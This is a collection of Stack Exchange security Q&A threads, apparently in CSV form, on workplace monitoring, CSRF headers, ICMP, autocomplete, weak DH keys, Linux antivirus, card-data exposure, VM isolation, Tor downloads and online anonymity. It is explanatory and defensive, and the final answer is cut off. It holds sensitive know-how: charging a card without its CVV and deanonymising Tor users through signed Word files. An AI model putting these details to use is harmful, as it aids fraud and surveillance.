"Using Private Browsing mode while connected to organization's network","47881","","<p>At the workplace I use the organization's network for accessing internet (well that's the only option).
I am not sure if the network administrators monitor what I browse, how frequently I access social media websites. But I guess they would/should be doing.</p>

<p>So here's my question - If I use Private Browsing Mode to access websites (lets say social networking sites), will the network administrator find any clue that I am using Private Browsing Mode? And what all websites I am accessing through it?</p>
","<p>As others say - Private Browsing is a protection for your workstation/laptop - great if you want to clean it because it's used publicly.  Not great for eluding your network admins.</p>

<p>The company you work for does have the right to set a policy for how it's resources are used, and monitor that employees stick within the policy.  The analogy of a phone system is apt - you've reset your ""phone"", you haven't erased your phone bill which shows every number you called.</p>

<p>Depending on configuration, your company can see what IP addresses you visited, what URLs you requested, the traffic sent between the sites and you, content transmitted between the sites and you, and get a rough sense of for how long you were visiting the sites.  The sites you visit do represent a security risk, and the company has a right to monitor and protect itself from that risk.</p>

<p>Practically speaking, it's rare for a company to scrutinize employee by employee.  Collecting the data, sorting it for each employee, and going through it in details is just way more work than a company of any size wants to consider.  In a big company, it's like finding a needle in a haystack, in small companies, the one guy who can do this is just too busy. </p>

<p>Generally, you have to do some or all of the following for this to come into play:</p>

<ul>
<li>do very poorly in job performance - to the point where they wonder what you are doing, because it clearly isn't work...</li>
<li>have a major security issue - if you get hacked or get a virus, they will fix it, research why it happened and try to prevent it in the future.  That extra scrutiny can bring on questions of why you were on a social site if the company policy prohibits it.</li>
<li>visit sites excessively, and compromise availability of resources - if you are streaming Hulu, Netflix, YouTube, etc for the entire work day, you are limiting bandwidth for legitimate use.  When the executive says ""why is this so slow?"", you don't want to be the reason.</li>
</ul>

<p>In all honesty, I find the best answer to be - if you want your behavior to stay private, don't do it at work.  The computer for work was given to you for work.  Generally some polite social browsing in limited scope is not against the rules, if it doesn't impact your work... but the point of the computer they gave you wasn't for your personal enjoyment.  If your privacy is important, do it at home, or pack a personal device with net access - it's getting easier and easier with smart phones and tablets to get off the company network entirely.</p>
","37372"
"CSRF protection with custom headers (and without validating token)","47557","","<p>For a REST-api it seems that it is sufficient to check the presence of a custom header to protect against CSRF attacks, e.g. client sends</p>

<p>""X-Requested-By: whatever""</p>

<p>and the server checks the presence of ""X-Requested-By"" and drops the request if the header isn't found. The value of the header is irrelevant. This is how Jersey 1.9's CsrfProtectionFilter works and it is described in this blog post: <a href=""http://blog.alutam.com/2011/09/14/jersey-and-cross-site-request-forgery-csrf/"">http://blog.alutam.com/2011/09/14/jersey-and-cross-site-request-forgery-csrf/</a>. The blog post also links to NSA and Stanford papers stating that the custom header itself is sufficient protection:</p>

<blockquote>
  <p>The first method involves setting custom headers for each REST request
  such as  X-XSRF-Header. The value of this header does not matter;
  simply the presence  should prevent CSRF attacks. If a request comes
  into a REST endpoint without the  custom header then the request
  should be dropped.   </p>
  
  <p>HTTP requests from a web browser performed via form, image, iframe,
  etc are  unable to set custom HTTP headers. The only way to create a
  HTTP request from a  browser with a custom HTTP header is to use a
  technology such as Javascript  XMLHttpRequest or Flash. These
  technologies can set custom HTTP headers, but  have security policies
  built in to prevent web sites from sending requests to each other 
  unless specifically allowed by policy. This means that a website
  www.bad.com cannot send a request to <a href=""http://bank.example.com"">http://bank.example.com</a> with the
  custom header X-XSRFHeader unless they use a technology such as a
  XMLHttpRequest. That technology  would prevent such a request from
  being made unless the bank.example.com domain  specifically allowed
  it. This then results in a REST endpoint that can only be called  via
  XMLHttpRequest (or similar technology).  </p>
  
  <p>It is important to note that this method also prevents any direct
  access from a web  browser to that REST endpoint. Web applications
  using this approach will need to  interface with their REST endpoints
  via XMLHttpRequest or similar technology.</p>
</blockquote>

<p>Source: <a href=""http://www.nsa.gov/ia/_files/support/guidelines_implementation_rest.pdf"">Guidelines for implementing REST</a></p>

<p>It seems however, that most other approaches suggest that you should generate a token and also validate this on the server. Is this over-engineering? When would a ""presence of"" approach be secure, and when is also token validation required?</p>
","<p>Security is about defence in depth. Simply checking the value is sufficient <em>at the moment</em>, but future technologies and attacks may be leveraged to break your protection. Testing for the presence of a token achieves the absolute minimum defence necessary to deal with current attacks. Adding the random token improves the security against <em>potential</em> future attack vectors. Using a per-request token also helps limit the damage done by an XSS vulnerability, since the attacker needs a way to steal a new token for every request they make.</p>

<p>This is the same reasoning used in modern cryptographic algorithms, where <code>n</code> rounds are considered a minimum for safety, but <code>2n+1</code> rounds (for example) are chosen in the official implementation to ensure a decent security margin.</p>

<p>Further reading:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/10227/csrf-with-json-post"">CSRF with JSON POST</a></li>
<li><a href=""https://security.stackexchange.com/questions/22903/why-refresh-csrf-token-per-form-request"">Why refresh CSRF token per form request?</a></li>
</ul>
","23373"
"Security risk of PING?","47409","","<p>I have been told that PING presents a security risk, and it's a good idea to disable/block it on production web servers.  Some <a href=""http://www.cse.ohio-state.edu/siefast/group/publications/gouda2001wsss.pdf"">research</a> tells me that there are indeed security risks.  Is it common practice to disable/block PING on publicly visible servers?  And does this apply to other members of the ICMP family, like traceroute (<a href=""http://en.wikipedia.org/wiki/Traceroute#Security_concerns"">wikipedia on security</a>)?</p>
","<p>The <a href=""http://tools.ietf.org/html/rfc792"">ICMP Echo protocol</a> (usually known as ""Ping"") is mostly harmless. Its main security-related issues are:</p>

<ul>
<li><p>In the presence of requests with a fake source address (""spoofing""), they can make a target machine send relatively large packets to another host. Note that a Ping response is not substantially larger than the corresponding request, so there is no multiplier effect there: it will not give extra power to the attacker in the context of a denial of service attack. It might protect the attacker against identification, though.</p></li>
<li><p>Honored Ping request can yield information about the internal structure of a network. This is not relevant to publicly visible servers, though, since those are already publicly visible.</p></li>
<li><p>There used to be security holes in some widespread TCP/IP implementations, where a malformed Ping request could crash a machine (the <a href=""http://en.wikipedia.org/wiki/Ping_of_death"">""ping of death""</a>). But these were duly patched during the previous century, and are no longer a concern.</p></li>
</ul>

<p>It is common practice to disable or block Ping on publicly visible servers -- but being <em>common</em> is not the same as being <em>recommended</em>. <code>www.google.com</code> responds to Ping requests; <code>www.microsoft.com</code> does not. Personally, I would recommend letting all ICMP pass for publicly visible servers.</p>

<p>Some ICMP packet types <strong>MUST NOT</strong> be blocked, in particular the ""destination unreachable"" ICMP message, because blocking that one breaks <a href=""http://en.wikipedia.org/wiki/Path_MTU_Discovery"">path MTU discovery</a>, symptoms being that DSL users (behind a PPPoE layer which restricts MTU to 1492 bytes) cannot access Web sites which block those packets (unless they use the Web proxy provided by their ISP).</p>
","4442"
"Should websites be allowed to disable autocomplete on forms or fields?","47382","","<p>Currently, there is an HTML <code>form</code>/<code>input</code> attribute called <code>autocomplete</code>, which, when set to <code>off</code>, disables autocomplete/autofill for that form or element.</p>

<p>Some banks seem to use this to prevent password managers from working. These days sites like Yahoo Mail seem to do it as well because they feel that password managers are unsafe.</p>

<p>A few weeks ago I implemented a <a href=""https://bugzilla.mozilla.org/show_bug.cgi?id=425145"">feature</a> in Firefox that gives the user an option to override this for <strong>username/password fields only</strong> (i.e. to disable the password manager). There now is <a href=""https://bugzilla.mozilla.org/show_bug.cgi?id=956906"">a request</a> that is asking for it to override <code>autocomplete=off</code> by default. Quoting the issue:</p>

<blockquote>
  <p>This behavior is a concession to sites that think password managers are harmful and thus want to prevent them from being effective. In aggregate, I think those sites are generally wrong, and shouldn't have that much control over our behavior.</p>
</blockquote>

<p>This makes sense to me, for similar reasons as the ones <a href=""https://bugzilla.mozilla.org/show_bug.cgi?id=425145#c55"">in this comment by BenB</a>.</p>

<blockquote>
  <p>autocomplete=off has been abused a lot recently. Yahoo started using
  it for their login (including webmail and my.yahoo.com), which is why
  I stopped using Yahoo. Webmail apps - even some bigger providers - now
  use it, which was decidedly not the purpose. The admins are very
  self-righteous, and insist that the keep this ""for security"" because
  password saving ""is unsafe"".</p>
  
  <p>They are misguided, because </p>
  
  <ul>
  <li>keyboard loggers exist and are
  widespread, probably more widespread than malware that can read
  Firefox password store.</li>
  <li>even simple attacks by the little nephew
  exist: Just look over the shoulder</li>
  <li>possibly most importantly,
  forcing users to re-enter their password every time practically forces
  them to use a simple password - easy to remember, easy to type,
  probably even used on multiple websites. This obviously <em>lowers</em>
  overall security dramatically and thus poses a danger to security.</li>
  </ul>
  
  <p>So, autocomplete=off is actively harmful for security.</p>
  
  <p>And a massive pain for end users, without a recurse for them apart
  from severing entire customer relationships.</p>
</blockquote>

<p>There have been many workarounds (usually bookmarklet-based) that have been posted on the Internet. <a href=""http://lists.w3.org/Archives/Public/public-webapps/2014JanMar/0015.html"">IE11 has already removed support for <code>autocomplete=off</code></a>.</p>

<p>The question is twofold:</p>

<ul>
<li>Is there any significant increase in security for a website when it uses <code>autocomplete=off</code> on password fields? Or is it actually harmful to security as per BenB's comment?</li>
<li>Should browsers allow this attribute by default and give this much control to the website? (This bit is subjective, feel free to not answer)</li>
</ul>

<p>While my situation is specific to <code>autocomplete=off</code> for username/password fields (the code only affects the password manager), I do welcome input on the broader aspect of disabling <code>autocomplete=off</code></p>
","<p>The problem is that this one setting simultaneously controls the behavior of two similar but sufficiently dissimilar functions in the browser such that an optimal result is difficult to achieve.</p>

<h2>First, we have what you might call ""smart"" or ""naïve"" or ""automatic"" auto-complete.</h2>

<p>This is the <em>original</em> auto-complete technology. As you fill in forms on various sites, the browser watches the names of the forms and the contents you fill, and silently remembers the details. Then, when visiting another site with a similar-looking form, it ""helpfully"" fills in fields using the values it filched from your previous behavior on other sites.</p>

<p>The idea here is to save you time without any configuration or decision-making on your part. Filling in your name? We'll automatically fill in the name you used last time. Filling in a credit card? We'll fill in the credit card you used elsewhere.</p>

<p>In its zeal to be helpful, the browser is sharing your secrets from one site with all the others, just in case it's what you wanted. From a security perspective, this is a disaster for all the obvious reasons and for several non-obvious ones as well. It has to be disabled, and probably shouldn't have ever been implemented to begin with.</p>

<h1>Second, we have ""explicit"" or ""secure"" or ""configured"" auto-complete</h1>

<p>This is the world, primarily, of saved usernames and passwords. In this incarnation, the browser saves your form data only with your explicit approval. Ideally, it stores that data in an encrypted store, and most critically, the data is firmly associated with a single site. So your Facebook password stays with Facebook, and your Amazon address stays with Amazon. </p>

<p>This technique is critically different in that the browser is replaying saved behavior when the matching environment is detected. By comparison, the other technique is <em>anticipating</em> desired behavior automatically by looking for similarities.</p>

<p>When you visit the site and it presents a login form, your browser <em>should</em> helpfully auto-fill the data you had explicitly saved for that purpose. The interaction should be quick and thought-free for the user. And, <em>critically</em>, should absolutely BREAK in a phishing attempt. The browser should be so completely unwilling to deliver credentials to a phishing site such that it makes her stop and think about <em>why</em> the thing isn't working.</p>

<p>This feature is your <em>primary</em> line of defense against phishing. It has to work. You are unavoidably <em>less</em> secure if the user can't depend on this feature working transparently and effortlessly under normal conditions.</p>

<p>And while this is primarily used for credential storage, it's also a secure place to put other secure data as well, such as payment cards, address, security questions, etc. Such additional data probably won't be site-specific, but should probably not auto-fill without prompting.</p>

<h1>One option to rule them all</h1>

<p>The problem here is that in many implementations, the <code>autocomplete=false</code> option controls <strong>both</strong> behaviors. Both the one you want to keep, and the one you want to kill. </p>

<p>Ideally, ""secure"" auto-complete should never be disabled. We're relying on this feature to add safety, so misguided site operators shouldn't be allowed to jeopardize that. </p>

<p>And ideally, ""automatic"" auto-complete should be disabled by default, to be enabled only for those rare conditions (if any) where you actually <em>want</em> the browser to re-use your input from other sites.</p>
","51906"
"Firefox:Secure connection failed(Error code:ssl_error_weak_server_ephemeral_dh_key)","47381","","<p>A screenshot of the problem:
<img src=""https://i.stack.imgur.com/XCW61.png"" alt=""enter image description here"">
Browser: Firefox 39.0</p>

<p>Is this a problem with my browser?<br>
How can I solve this?</p>
","<blockquote>
  <p>Is this a problem with my browser?</p>
</blockquote>

<p>Firefox 39 and the Firefox 31 and 38 ESR releases upgrade the TLS implementation NSS to version 3.19.1. To harden the browser against <a href=""https://weakdh.org/"" rel=""nofollow noreferrer"">Logjam</a> attack the minimum key length for DH parameter within the TLS handshake <a href=""https://www.mozilla.org/en-US/security/advisories/mfsa2015-70/"" rel=""nofollow noreferrer"">is now 1023 bits</a>. But the server at acs.onlinesbi.com only uses a DH key of 768 bits. This key length is considered insecure because it might already be broken by academic research and more so by a state sponsored attacker with more computing power.</p>

<blockquote>
  <p>How can I solve this?</p>
</blockquote>

<p>The site needs to upgrade their security. It is expected that other browsers increase the minimal required DH key length in the near future too so that the site will not be reachable by lots of users unless they improve their security.</p>

<p>To use the site with the current Firefox version follow the instructions below (from <a href=""http://forums.mozillazine.org/viewtopic.php?p=14165963&amp;sid=d5c12854f379b00d84c7411409acc19e#p14165963"" rel=""nofollow noreferrer"">this MozillaZine.org forum post</a>) to disable use of DH ciphers in Firefox:</p>

<ol>
<li><p>In a new tab, type or paste <code>about:config</code> in the address bar and press <kbd>Enter</KBD>. Click the button promising to be careful.</p></li>
<li><p>In the search box above the list, type or paste <code>ssl3</code> and pause while the list is filtered</p></li>
<li><p>Double-click the <code>security.ssl3.dhe_rsa_aes_128_sha</code> preference to switch it from true to <strong>false</strong> (this usually would be the first item on the list)</p></li>
<li><p>Double-click the <code>security.ssl3.dhe_rsa_aes_256_sha</code> preference to switch it from true to <strong>false</strong> (this usually would be the second item on the list)</p>

<p><strong>Note:</strong> A browser restart is not required. The change takes effect immediately.</p></li>
</ol>

<p>This will cause FireFox to fall back to non-DH ciphers so that the weak DH key is not in use. Note that this effectively disables <a href=""https://en.wikipedia.org/wiki/Forward_secrecy"" rel=""nofollow noreferrer"">Forward Secrecy</a> with sites which don't support ECDH but only DH.</p>
","93118"
"Should I get an antivirus for Ubuntu?","47333","","<p>Considering the recent thread regarding <a href=""https://security.stackexchange.com/questions/62835/should-i-get-an-antivirus-for-my-mac"">anti-virus for the Mac</a> I wonder how many of the arguments put forth are relevant today to Linux systems, specifically Ubuntu.</p>

<ul>
<li><p>There are no known Ubuntu desktop malware in the wild.</p></li>
<li><p>GNU/Linux is a very tempting target for botnets, considering that powers a substansial fraction of webservers. Additionally, these webservers are generally higher-provisioned and have better bandwidth than potential desktops botnets.</p></li>
<li><p>Anti-malware packages for Linux are mostly targeted to Windows infections that may 'pass through' Linux, such as on a mailserver. This is not relevant for an Ubuntu desktop.</p></li>
<li><p>Some of the available Linux anti-malware applications seem just as shady as their Windows counterparts.</p></li>
<li><p>These solutions may or may not protect against macros in LibreOffice documents, web browswer or extensions' flaws (Flash), XSS attacks, Java vulnerabilities, and other userland software.</p></li>
<li><p>People are stupid. Someone might run nakedgirls.deb if an ambitious malware dev were to promote it. I'm sure that this is only a matter of time.</p></li>
</ul>

<p>Note that though there are many other distros and desktops based on GNU/Linux, in the interest of keeping on focus I would like to limit this thread to a discussion of <strong>standard-install Ubuntu desktops only</strong>. Think ""desktops for grandma"". Users of Slackware, those running mail- or web-servers, or those using their desktops for other purposes would presumably (ha! I'm not really that naive) know what they are doing and the risks involved.</p>
","<p><strong>You can install an antivirus</strong> if you want. It should not hurt your machine, but don't expect much protection for your system and <strong>don't consider yourself entirely safe</strong>. The efficacy of antivirus software is very relative, and they're mostly in use to avoid propagate old malware especially if you have Windows machines in your ecosystem. You should expect a performance decrease, though there are no benchmarks of AV performance on Linux as of today so it can't be quantified.</p>

<p><strong>Why is it that you're not safe with just an antivirus? Because they're only one part of the needed mechanisms.</strong> At the moment there are a lot of missing tools for desktop security on Linux. What are the different security mechanisms relevant to desktops?</p>

<ul>
<li><strong>Graphic stack security</strong> (to prevent keyloggers, clickjacking, screen recording, clipboard sniffing, etc)</li>
<li><strong>App distribution schemes</strong> with security checks (app stores and repositories with static analysis on the apps) and fast security updates</li>
<li><strong>Malware detection</strong>: signature-based (to protect from identified threats) and  heuristics-based (or so they say, I've never used any heuristics-based AV and I suspect this is mostly marketing talk to say ""we'll throw tons of security warnings at your face when you use a new app"")</li>
<li><strong>Sandboxing</strong> (which consists of isolating apps from one another by design)</li>
<li><strong>Contextual authorisation to use devices and user data</strong> with <a href=""http://zesty.ca/pubs/yee-sid-ieeesp2004.pdf"">security by designation</a> / user-driven access control / powerboxes / contracts ; requires sandboxing</li>
</ul>

<p><strong>Currently the only decent thing on Linux is the app security updates, through repositories. All the rest is substandard.</strong></p>

<h2>Graphic stack security</h2>

<p>We're all relying on the X11 graphical server. X.Org existed for 30 years and the original design is still in use in the server. Back in the day there were no desktop security issues and you won't be surprised to learn that it's not secure at all. You have APIs right out of the box for implementing keyloggers, doing remote code exploitations if the user has any root console open, replacing the session locker to steal passwords, etc, etc.</p>

<p>It's hard to evaluate how Windows 8 and OS X fare on this topic because I could not find any detailed explanations on their graphic stack implementation. Their sandboxed apps have restricted access to most obvious attack vectors but it's really unclear how well designed and implemented this all is. It seems to me that Win 8 forcing Store Apps to run fullscreen and one at a time hides issues in designing a full scale secure window manager. There are lots of issues to take into consideration wrt. window position and sizing, use of transparency and fullscreen, etc. when implementing a window manager with security in mind. I have no idea how OS X does.</p>

<p>Linux will be switching to <a href=""http://wayland.freedesktop.org"">Wayland</a> in the coming years, which is designed with security in mind. We have a clear model of what capabilities should exist and a general idea of how these will be enforced and how authorisation can be obtained. The main person behind this work is <a href=""http://mupuf.org"">Martin Peres</a> though I happen to be involved in discussing the user and developer experience behind the capabilities. Design and development are ongoing so don't expect anything any time soon. Read <a href=""http://mupuf.org/blog/2014/02/19/wayland-compositors-why-and-how-to-handle/"">this post</a> for more information. Wayland will provide security seamlessly when used in conjunction with app sandboxing.</p>

<h2>App distribution</h2>

<p>Linux has a system of repositories with various levels of trust, which trained our users to rely only on provided apps and to be wary of proprietary code. This is very good in theory.</p>

<p>In practice <strong>I don't know a single distributor that enforces even the most basic security checks on their packaged apps</strong>. No static analysis whatsoever for weird system calls, and for anything community it's really not clear whether pre- and post-install scripts (which run as root) are verified at all for obvious bad things.</p>

<p>The security checks done on extensions to GNOME Shell are very light and manual, but at least exist. I don't know about KDE's extensions or other apps.</p>

<p>One area where we shine is that we can pull security updates very fast, usually within a few days for any security flaw. Until recently Microsoft was much slower than that, though they caught up.</p>

<h2>Malware detection</h2>

<p>The only antivirus software I know on Linux is ClamAV. It seems to me that it only works based on signatures, but then again as you pointed out, we don't have any identified desktop malware to protect against.</p>

<p><strong>There probably are people writing Linux desktop malware in the world of Advanced Persistent Threats.</strong> See <a href=""http://www.doctrackr.com/blog/bid/374310/Mask-The-Most-Sophisticated-Malware-and-How-to-Protect-Against-It"">Mask</a> for an example. It's unlikely that standard AV can do anything against those since APT malware authors are usually talented enough to come up with zero-day exploits.</p>

<p>Now, Microsoft advertises fuzz-testing all of its software for tens of thousands of hours, as opposed to virtually no secure coding practices at all in the Linux ecosystem. From personal experiments with fuzzing I'm absolutely convinced that <strong>there are a handful of low-hanging zero-day exploits in some popular Linux software</strong>. This will come to hit us on the day we have a financially-viable user base for commonplace malware authors, and then we'll see how good ClamAV turns out to be, but I suspect the app update mechanism will have a bigger impact at dealing with discovered vulnerabilities.</p>

<p>Needless to say both Windows and OS X do significantly better than Linux on this criteria.</p>

<h2>Sandboxing and contextual authorisation</h2>

<p>Both OS X and Windows 8 provide sandboxing for the apps hosted on their store. I'm not done looking into the quirks of OS X, but Windows 8 Store Apps have very serious limitations in terms of languages and APIs supported, available features and general user experience that can be provided with them. That means unsandboxed desktop apps are here to stay and Microsoft's sandboxing will <em>not</em> protect against malware, only against crafted documents in buggy (Store App) software. OS X seems to do much better though any non-store app is not sandboxed, as well.</p>

<p><strong>Linux has no GUI app sandbox working seamless enough at the moment.</strong> We have the underlying confinement technology (the best candidates being Containers based on Linux namespaces, see <a href=""https://linuxcontainers.org/"">LXC</a> and <a href=""http://www.docker.com/"">Docker</a>, and the next-to-best being MAC enforcement systems that would need to be developed to support some amount of dynamicity). We almost have the IPC and process management mechanisms needed to deploy and handle those sandboxed apps thanks to amazing work on <a href=""https://github.com/gregkh/kdbus"">kdbus</a> and <a href=""http://www.freedesktop.org/wiki/Software/systemd/"">systemd</a>. There are a few bits missing, with a few proposals being pushed mostly by the GNOME Foundation (see this video on <a href=""http://videos.guadec.org/2013/Sandboxed%20applications%20for%20GNOME/video_HD.mp4"">Sandboxing at GUADEC 13</a>). I'm also involved in discussing how access to data and authorisation can occur but there's no consensus between the few interested people, and design and development take time. It'll probably be a couple more years before decent prototypes exist and before sandboxing is deployed to Linux on any relevant scale.</p>

<p>One of the big issues faced on all platforms is finding out how to authorise apps to get access to data and device capabilities at the right scale. That means, how to let them do what they need to do without pestering users with authorisation prompts whilst preventing apps from abusing privileges. There are serious loopholes in how Windows 8 lets Store Apps handle recent documents and apps' <a href=""http://msdn.microsoft.com/library/windows/apps/windows.storage.accesscache.storageapplicationpermissions.futureaccesslist.aspx"">futureAccessList</a>. At this stage securing document access further without aggravating the cost of security for developers and users is an open question, which a bunch of people happen to be working on as well :)</p>
","63101"
"What's the impact of disclosing the front-face of a credit or debit card?","47120","","<p>There are quite a few cases where people are called out for disclosing the front-face of a credit or debit card (e.g. <a href=""https://twitter.com/briankrebs/status/260578641094770689"">this tweet from Brian Krebs</a> or this <a href=""https://twitter.com/NeedADebitCard"">twitter account</a>). So I was wondering what the impact of this disclosure for the card holder is likely to be.</p>

<p>From the front of a card, a fraudster could get the card PAN (16-digit number) start date/expiry date and cardholder name.  Also for debit cards, the cardholders account number and sort code (that may vary by region).</p>

<p>So the question is, what's the likely impact of the disclosure of this information (i.e. what frauds could be committed).</p>

<p>Some initial thoughts I had were :-</p>

<ul>
<li>Cardholder Not Present transactions <em>shouldn't</em> be possible as the CVV hasn't been disclosed</li>
<li>The card wouldn't be clonable with just that information as there's other information needed for the magstripe.</li>
</ul>
","<p>You don't actually <em>need</em> the CVV to perform transactions, they're just required by most retailers as a means of verifying that you have the physical card in your possession.</p>

<p>From <a href=""http://en.wikipedia.org/wiki/Card_Verification_Value"">Wikipedia</a> (unsourced):</p>

<blockquote>
  <p>It is not mandatory for a merchant to require the security code for making a transaction, hence the card is still prone to fraud even if only its number is known to phishers.</p>
</blockquote>

<p>On most EFTPOS systems, it's possible to manually enter the card details. When a field is not present, the operator simply presses enter to skip, which is common with cards that don't carry a start date. On these systems, it is trivial to charge a card without the CVV. When I worked in retail, we would frequently do this when the chip on a card wasn't working and the CVV had rubbed off. In such cases, all that was needed was the card number and expiry date, with a signature on the receipt for verification.</p>
","23022"
"Does a Virtual Machine stop malware from doing harm?","46801","","<p>I would like to know if it is safe for the host system of a virtual machine (VM - VirtualBox OSE in my case) to execute malware. </p>

<p>Can a virus break out and read or write data from the host system? Can it establish an Internet connection if I disable it in my VM?</p>

<p>Is a VM a safe environment to try to find out what a virus does?</p>

<p>Can a fork bomb ""kill"" the host system if I reduce the memory to about 1/4 of my total real memory? How much CPU-time/resources can it use?</p>
","<p>Theoretically, the guest system is totally isolated by the VM and cannot even ""see"" the host, let alone attack it; so the guest cannot break out of the VM. Of course, in practice, <a href=""http://www.darkreading.com/security-services/167801101/security/application-security/217701908/hacking-tool-lets-a-vm-break-out-and-attack-its-host.html"">it has occasionally happened</a> (<a href=""https://web.archive.org/web/20130202223332/http://www.darkreading.com/security-services/167801101/security/application-security/217701908/hacking-tool-lets-a-vm-break-out-and-attack-its-host.html"">web archive link</a>). An attack requires exploiting a security issue (i.e. a programming bug which turns out to have nasty consequences) in the VM implementation or, possibly, the hardware features on which the VM builds on. There are few exit routes for data out of the VM; e.g., for Internet access, the VM is emulating a virtual network card, which deals only with the lowest level packets, not full TCP/IP -- thus, most IP-stack issues remain confined within the VM itself. So bugs leading to breakout from VM tend to remain rare occurrences.</p>

<p>There are some kinds of attacks against which VM are very effective, e.g. fork bombs. From the point of view of the host system, the VM is a single process. A fork bomb in the guest will bring to its knees the scheduler in the <em>guest</em> OS, but for the host this will be totally harmless. Similarly for memory: the VM emulates a physical machine with a given amount of RAM, and will need about that amount of ""real"" RAM to back it up efficiently. Regardless of what the guest does, the VM will never monopolize more RAM than that. (You still want to limit VM RAM size to, say, at most 1/2 of your physical RAM size, because the extra ""real"" RAM is handy for disk caching; and the host OS will want to use some, too.)</p>
","9017"
"Downloading files using Tor","46769","","<p>I have the Tor Browser Bundle installed and have been using the Firefox Tor browser. If I attempt to download a file or email attachment I get the following warning</p>

<p><img src=""https://i.stack.imgur.com/6IctR.png"" alt=""enter image description here""></p>

<p>I understand that if I download an untrusted file containing a script it could reveal my IP address. However, I want to know if my IP address is still completely hidden if I download a web based email attachment such as Word, Excel or other file that I trust?</p>
","<p>Ah, trust, that fickle thing...</p>

<p><a href=""https://www.torproject.org/"">Tor</a> provides anonymity for the download part. A download is: to obtain a sequence of bytes. What you do with these bytes is then completely up to you.</p>

<p><em>Some</em> sequences of bytes encode executable instructions that a computer will be eager to run. Executable files, scripts... fall in that category. If the file you download contains instruction, and these instructions have been designed to be hostile to you and your anonymity, and you execute them nonetheless, well, then you get what you asked for. The warning popup displayed by Tor is a kind of disclaimer: it <em>reminds</em> you that the magic of Tor stops at the downloading, but does not guarantee that the file you obtained is not full of nastiness.</p>

<p>Now for Word documents. Theoretically, a Word file contains the description of a written document, possibly with pictures; but, in practice, a Word document can embed just about anything, including executable applications. Word also supports a complex system of macros, which are, by any reasonable definition, a programming language. Thus, ""opening"" a Word document is quite akin to running a script. And, indeed, <a href=""http://en.wikipedia.org/wiki/Macro_virus"">macro virus</a> do exist.</p>

<p><strong>Even with macros disabled</strong>, some nifty attacks against anonymity can be performed with Word files. For instance, Word documents can be <a href=""http://office.microsoft.com/en-ca/word-help/add-or-remove-a-digital-signature-in-office-documents-HA010099768.aspx"">signed</a>. Word will want to verify this signature, which means first validating some <a href=""http://en.wikipedia.org/wiki/X.509"">X.509 certificates</a>, which in turn may make your computer download some intermediate CA certificates and/or CRL by following URL found in the certificates themselves. As such, a Word document which you merely open may imply network activity to target names that are embedded in the document (well, in certificates which are embedded in the document). The nice part is that these accesses will be performed by some system components which may completely disregard your browser configuration -- thus happening outside of the Tor umbrella. Goodbye anonymity !</p>

<p>So don't open potentially hostile Word documents. However, if you <em>trust</em> the file, then there is no problem, yes ? At least as long as you can be <em>sure</em> that the file you got is really the one you <em>believe</em> it is... Amusingly enough, <a href=""https://en.wikipedia.org/wiki/Digital_signature"">digital signatures</a> can help you there, but the mere act of verifying the signature can entail activity which makes you totally non-anonymous, as explained above.</p>

<p>(The same applies to PDF, Excel...)</p>
","39871"
"How can someone go off-web, and anonymise themselves after a life online?","46138","","<p>With data mining tools like <a href=""http://www.paterva.com/web6/"" rel=""noreferrer"" title=""discover open data sources, and graph the data"">Maltego</a> and other correlation tools for large data sets, if we conduct any transactions online assume that these can all be collated to build a good picture of what we do, buy, read etc (hence Google etc).</p>

<p>If a normal person, with a large online history decides to go off-web, is there an effective way to do this?</p>

<hr>

<blockquote>
  <p>This question was featured as an <strong><a href=""http://security.blogoverflow.com/category/question-of-the-week/"" rel=""noreferrer"">Information Security Question of the Week</a></strong>.<br/>
  Read the Jan 27, 2014 <strong><a href=""http://security.blogoverflow.com/2014/01/qotw-49-how-can-someone-go-off-web-and-anonymise-themselves-after-a-life-online/"" rel=""noreferrer"">blog entry</a></strong> for more details or <strong><a href=""https://security.meta.stackexchange.com/q/1018/485"">submit your own Question of the Week</a></strong>.</p>
</blockquote>
","<p>The problem is heuristics. All mentioned tools are built on heuristics and the only way to avoid them is to change how you live completely. You can be fingerprinted by the modules installed in your browser. By the programs you use and the frequency you use them. </p>

<p>These days you're going further than just online behavior. Shops know what you buy in what amounts, because nobody buys all the same brands you are getting fingerprinted constantly. This is used for targeted advertising, but it can also theoretically be used to track you.</p>

<p>MIT's Reality Mining project proved the same using smartphones. You prefer certain apps, you use your phone at certain intervals, you move around certain places. This all contributes to a somewhat unique pattern (back when I did some research on it during my internship we were getting 91% certainty in simulations, even when people changed their SIM card every few days we were still able to track them  based on the SSIDs they encountered, places they went, apps they installed and used, when they checked their phones, Bluetooth devices they connect to, cell towers they passed at a certain moment in time and what smileys they use in text messages). </p>

<p>Avoiding heuristics means changing everything you do completely. Stop using the same apps, accounts, go live somewhere else and do not buy the same food from the same brands. The problem here is that this might also pop up as a special pattern because it is so atypical.  </p>

<p>Changing your identity is the first step. The second one is not being discovered. As Thomas said the internet doesn't forget. This means that photos of you will remain online, messages you posted, maybe even IDs you shared will remain on the net. So even when changing your behavior it only will need one picture which might expose you. </p>
","47298"
"How does Windows 10 allow Microsoft to spy on you?","46098","","<p>Windows 10 is perhaps the most Internet-connected and cloud-centric operating system released by Microsoft to date. This, of course, has caused many users to be concerned about how the OS respects their privacy (or doesn't).</p>

<p>Multiple sources are now claiming that this OS reports user data to Microsoft which could be violating the users' assumptions of privacy. (A couple of examples are linked below.)</p>

<p>How legitimate are these concerns and claims? Is Microsoft actually collecting data about Windows&nbsp;10 users' location and activity? Are they actually authorized to do so, simply by a user's acceptance of the EULA?</p>

<p>I'm aware that Windows&nbsp;10 sends malware files to Microsoft for analysis. This is a common and generally-accepted practice for most antivirus products, and antivirus is known to be integrated into this OS. What about the other information?</p>

<ul>
<li><a href=""http://www.techworm.net/2014/10/microsofts-windows-10-permission-watch-every-move.html"">TechWorm - Microsoft’s Windows 10 has permission to watch your every move</a></li>
<li><a href=""https://boingboing.net/2015/08/10/windows-10.html"">BoingBoing - Windows 10 automatically spies on your children and sends you a dossier of their activity</a></li>
</ul>
","<p><a href=""http://windows.microsoft.com/en-us/windows/preview-privacy-statement"" rel=""nofollow noreferrer"">Microsoft Windows <strong>Pre-Release Preview</strong> (aka Windows Insiders) Privacy Statement,  January 2015</a>: (no longer applies)</p>

<blockquote>
  <p>When you acquire, install and use the Program software and services,
  Microsoft collects information about your use of the software and
  services as well as about the devices and networks on which they
  operate. Examples of data we may collect include your name, email
  address, preferences and interests; location, browsing, search and
  file history; phone call and SMS data; device configuration and sensor
  data; voice, text and writing input; and application usage. For
  example, when you:</p>
  
  <ul>
